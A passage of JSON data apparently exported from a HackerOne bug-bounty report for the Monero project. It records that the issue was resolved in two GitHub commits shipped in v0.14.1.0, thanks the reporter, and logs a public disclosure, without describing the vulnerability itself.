reports.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T21:11:11.270Z","updated_at":"2019-04-30T21:11:11.270Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5242077,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Resolved in https://github.com/monero-project/monero/commit/1d5e8f461de0a04891e5e18b0f50e9cf2cf534e1 and https://github.com/monero-project/monero/commit/a00cabd4f343cc10a1ccf6713c7ee2c9fa1496ea as seen in current release v0.14.1.0.\n\nThank you again, @guido.","markdown_message":"\u003cp\u003eResolved in \u003ca title=\"https://github.com/monero-project/monero/commit/1d5e8f461de0a04891e5e18b0f50e9cf2cf534e1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fcommit%2F1d5e8f461de0a04891e5e18b0f50e9cf2cf534e1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/commit/1d5e8f461de0a04891e5e18b0f50e9cf2cf534e1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca title=\"https://github.com/monero-project/monero/commit/a00cabd4f343cc10a1ccf6713c7ee2c9fa1496ea\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fcommit%2Fa00cabd4f343cc10a1ccf6713c7ee2c9fa1496ea\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/commit/a00cabd4f343cc10a1ccf6713c7ee2c9fa1496ea\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as seen in current release v0.14.1.0.\u003c/p\u003e\n\n\u003cp\u003eThank you again, \u003ca href=\"/guido\"\u003e@guido\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-03T00:02:04.766Z","updated_at":"2019-07-03T00:02:04.766Z","first_to_agree":true,"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5242093,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-03T00:11:28.576Z","updated_at":"2019-07-03T00:11:28.576Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}